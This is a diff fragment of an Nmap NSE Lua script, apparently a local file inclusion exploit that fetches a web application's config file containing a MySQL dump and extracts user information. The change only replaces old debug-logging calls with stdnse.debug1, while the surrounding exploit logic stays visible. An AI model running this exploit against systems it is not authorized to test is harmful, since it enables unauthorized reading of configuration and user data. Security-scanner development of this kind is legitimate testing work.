@@ -92,7 +92,7 @@ action = function(host, port)
   local config_file = ""
 
   -- Loop through vulnerable files
-  stdnse.print_debug(1, "%s: Connecting to %s:%s", SCRIPT_NAME, host.targetname or host.ip, port.number)
+  stdnse.debug1("Connecting to %s:%s", host.targetname or host.ip, port.number)
   for _, path in ipairs(paths) do
 
     -- Retrieve file
@@ -100,11 +100,11 @@ action = function(host, port)
     if data and data.status then
 
       -- Check if file exists
-      stdnse.print_debug(1, "%s: HTTP %s: %s", SCRIPT_NAME, data.status, tostring(path))
+      stdnse.debug1("HTTP %s: %s", data.status, tostring(path))
       if tostring(data.status):match("200") then
 
         -- Attempt config file retrieval with LFI exploit
-        stdnse.print_debug(1, "%s: Exploiting: %s", SCRIPT_NAME, tostring(path .. payload))
+        stdnse.debug1("Exploiting: %s", tostring(path .. payload))
         data = http.get(host, port, tostring(path .. payload))
         if data and data.status and tostring(data.status):match("200") and data.body and data.body ~= "" then
 
@@ -115,25 +115,25 @@ action = function(host, port)
           end
 
         else
-          stdnse.print_debug(1, "%s: Failed to retrieve file: %s", SCRIPT_NAME, tostring(path .. payload))
+          stdnse.debug1("Failed to retrieve file: %s", tostring(path .. payload))
         end
 
       end
 
     else
-      stdnse.print_debug(1, "%s: Failed to retrieve file: %s", SCRIPT_NAME, tostring(path))
+      stdnse.debug1("Failed to retrieve file: %s", tostring(path))
     end
 
   end
 
   -- No config file found
   if config_file == "" then
-    stdnse.print_debug(1, "%s: %s:%s is not vulnerable or connection timed out.", SCRIPT_NAME, host.targetname or host.ip, port.number)
+    stdnse.debug1("%s:%s is not vulnerable or connection timed out.", host.targetname or host.ip, port.number)
     return
   end
 
   -- Extract system info from config file in MySQL dump format
-  stdnse.print_debug(1, "%s: Exploit success! Extracting system info from MySQL database dump", SCRIPT_NAME)
+  stdnse.debug1("Exploit success! Extracting system info from MySQL database dump")
 
   -- Count users
   if string.match(config_file, "'user_default_email_address',") then
